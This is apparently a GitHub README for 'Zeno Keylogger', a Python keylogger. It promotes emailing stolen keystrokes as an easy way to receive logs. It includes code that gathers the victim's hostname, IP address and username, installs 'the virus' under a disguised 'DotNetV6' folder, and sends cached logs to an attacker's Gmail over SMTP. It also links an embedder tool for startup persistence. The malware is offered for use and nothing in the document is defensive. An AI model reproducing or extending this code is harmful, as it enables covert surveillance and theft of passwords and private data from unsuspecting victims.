![alt text](https://github.com/Zurek0x/zeno_Hijacker/blob/main/media/Screenshot_1.png?raw=true)
# Zeno Keylogger / Written in Python (EMAIL SERVICE)
This is a keylogger written in Python that includes certain sending methods of logs
specifically Email Servicing.
This is a better way to recieve logs since it doesn't require much effort or leaking
of server configurations or server handling which can be confusing for people and could
lead to more leaks.

# Usage (Pieces of code, Look in Source)
```python
# =?/Settings/?= #
hostname=socket.gethostname()   # Get Hostname of PC (For Logging)
IPAddr=socket.gethostbyname(hostname) # Get IP of PC (For Logging)

user = os.getlogin()# get username of PC
self_path=str(f"{os.getcwd()}") # Get Path of Self #
install_path=str(f"C:\\Users\\{user}\\Documents\\DotNetV6") # Path to install the virus too ( MUST HAVE \\ not \ )
email=str("null@gmail.com") # Email you want to recieve key logs on.
subject=str(f"") # DO NOT TOUCH THIS!
data=str("") # DO NOT TOUCH THIS!

cache = [""] # DO NOT TOUCH THIS!
filename=str("cache.txt") # Cache file name (must include .txt or .md)
file_size_limit_bytes=int(500) # File size limit before it sends Email and clears cache.
```
**Would suggest to change the full_size_limit_bytes=int(500) since this is the max file size before it sends the Email**
```python
class Mail:
    def __init__(self):
        self.port = 465
        self.smtp_server_domain_name = "smtp.gmail.com"
        self.sender_mail = "null@gmail.com"
        self.password = "null"
    def send(self, emails, subject, content):
        ssl_context = ssl.create_default_context()
        service = smtplib.SMTP_SSL(self.smtp_server_domain_name, self.port, context=ssl_context)
        service.login(self.sender_mail, self.password)
        for email in emails:
            result = service.sendmail(self.sender_mail, email, f"Subject: {subject}\n{content}")
        service.quit()

class Send:
    def Gmail(email, subject, data):
        mails=str(email).split()
        subject=subject
        content=str(data)
        print(content)
        mail = Mail()
        mail.send(mails, subject, content)
        print("Sent")
```

# !NOTICE FOR GMAIL OR GOOGLE USERS!
**For gmail users who are sending the Emails using Google Email Services like Gmail must setup a Less Secure App.**
**To set this up review the video here -> https://youtu.be/pAPWBHxnFHM <- Once you do this replace the 2 Lines below.**
![alt text](https://github.com/Zurek0x/zeno_Hijacker/blob/main/media/Screenshot_1.png?raw=true)

# Starting up with windows and extra stuff
To use these features you must import the code into zeno_Embedder which is a tool to do exactly this -> https://github.com/Zurek0x/zeno_Embedder
